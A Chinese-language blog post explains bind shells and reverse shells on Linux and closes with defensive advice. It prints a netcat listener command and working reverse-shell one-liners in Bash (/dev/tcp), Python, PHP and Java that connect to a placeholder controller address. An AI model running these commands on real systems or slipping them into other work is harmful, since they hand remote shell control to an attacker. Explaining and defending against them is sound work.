---
layout: post
title: Reverse Shell
categories: Linux
description:
keywords:
---

反弹 Shell（Reverse Shell）是相对于 Bind Shell 而言的，在控制端不方便主动连接被控端时（例如被控端被防火墙保护），让被控端主动连接到控制端接受控制。

Bind Shell 是指被控端机器运行 Shell 代码，监听固定端口，等待外部控制端发起连接，从而实现远程控制。
Bind Shell 过程：

1. 被控端创建 TCP Socket，并绑定到本地端口；
2. 被控端监听 TCP 连接，接受控制端发起的 TCP 连接；
3. 被控端将 STDIN，STDOUT，STDERR 重定向到控制端的 Socket；
4. 控制端发出 Shell 命令，由被控端执行并回显结果到控制端。

借助系统调用，使用汇编程序编写的 Bind Shell 程序可以压缩到仅 112 字节。
一旦侵入成功程序被执行，尤其是以高级别账号权限执行，控制端即可发起 TCP 连接，在被控端机器执行任意 Shell 命令。
但是 Bind Shell 也有不足：

1. 程序什么时候被执行无法预期，控制端只能通过轮询确认；
2. 被控端可能在局域网环境下，控制端无法连接；
3. 被控端机器 IP 可能动态变化，控制端无法持续控制；
4. 被控端可能被防火墙保护，只能发起请求，不能接受请求；或者限定了端口，但此端口已被占用。

针对以上不足，Reverse Shell 被提出，和 Bind Shell 的技术原理类似，只是过程不同：

1. 控制端创建 TCP Socket，并绑定到本地端口；
2. 控制端监听 TCP 连接，接受被控端发起的 TCP 连接；
3. 控制端将 STDIN，STDOUT，STDERR 重定向到被控端的 Socket；
4. 控制端发出 Shell 命令，由被控端执行并回显结果到控制端。

如图所示：

![](https://blog.finxter.com/wp-content/uploads/2020/07/reverseshell-768x432.jpg)

控制端执行命令：`nc -lvp 80` 可以直接监听指定的 TCP 端口。

被控端执行命令：`bash -i >& /dev/tcp/{控制端ip}/{控制端port} 0>&1`。
作用是生成交互式（interactive）的 Shell 环境，将标准输出重定向到控制端，将标准输入0重定向到标准输出1。
效果是被控端所有输入输出都显示在控制端，无论控制端的命令成功失败，被控端都没有任何信息打印。
如果控制端没有在监听，则被控端会输出连接被拒绝的错误提示信息，进程退出。
如果控制端停止监听，则被控端的程序立刻退出（因为连接已被断开）。
注意在 Linux 系统中，任意的设备都是文件，因此这里 `/dev/tcp/{控制端ip}/{控制端port}` 是连接到控制端的 Socket 的特殊方式。

编程语言也可作为被控端程序，例如

- python: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((ip,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
- php: `php -r '$sock=fsockopen($IP,$PORT);exec("/bin/sh -i <&3 >&3 2>&3");'`
- java: `r=Runtime.getRuntime();p=r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ip/port;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]);p.waitFor()`

一旦机器被控制，除了断绝访问外网能力，Reverse Shell 一般没有太好的防范方法。但仍然有以下手段加以预防和检测：

1. 确保服务器操作系统和应用程序保持在较新的状态，尤其是已知的安全补丁要保证到位，以减少能被利用的漏洞数量；
2. 应用程序尽量以较低权限运行，使得被代码注入后破坏面不至于过大；
3. 尽可能减少生产机器上的 Bash history 历史命令条数，避免在 Shell 命令中使用明文密码；
4. 确保服务器在防火墙以及其他网络防护软件之后，使得代码注入能被及时发现或阻止；
5. 服务器上运行必要的安全防护软件，最好能检测出异常的常驻 Shell 进程；
6. 定期进行安全攻防演练，发现系统潜在安全漏洞。

引用：

- https://cloud.tencent.com/developer/news/36975
- https://zhuanlan.zhihu.com/p/138393396
- https://resources.infosecinstitute.com/topic/icmp-reverse-shell/
- https://www.netsparker.com/blog/web-security/understanding-reverse-shells

License: [(CC 4.0) BY-NC-SA](http://creativecommons.org/licenses/by-nc-sa/4.0/)
